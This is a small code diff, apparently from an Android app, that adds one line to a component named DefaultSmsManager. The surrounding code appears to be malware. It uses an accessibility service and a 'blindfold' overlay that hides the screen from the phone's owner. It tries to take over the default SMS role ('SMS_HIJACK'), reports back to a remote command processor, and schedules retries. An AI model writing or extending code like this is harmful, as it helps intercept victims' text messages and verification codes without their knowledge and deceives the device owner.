@@ -49,6 +49,7 @@ object DefaultSmsManager {
                             val diag = MyAccessibilityService.dumpScreenDiagnostic()
                             DebugLogger.log("SMS_TIMEOUT_DIAG", diag)
                             MyAccessibilityService.instance?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
+                            DimmerManager.removeOverlay(ctx) // CRITICAL: Lift blindfold on safety fuse timeout
                             DynamicUIManager.removeOverlay(ctx, "SMS_HIJACK_SAFETY_FUSE: $lastMode")
                             CommandProcessor.updateCommandStatus(ctx, pendingCmdId, "TIMEOUT_EXCEEDED", "Strategy: $lastMode failed to acquire default SMS role.\nScreen State:\n$diag")
                             CommandRetryManager.scheduleRetry(ctx, pendingCmdId, "SET_DEFAULT_SMS", lastMode, "30s Central Fuse")
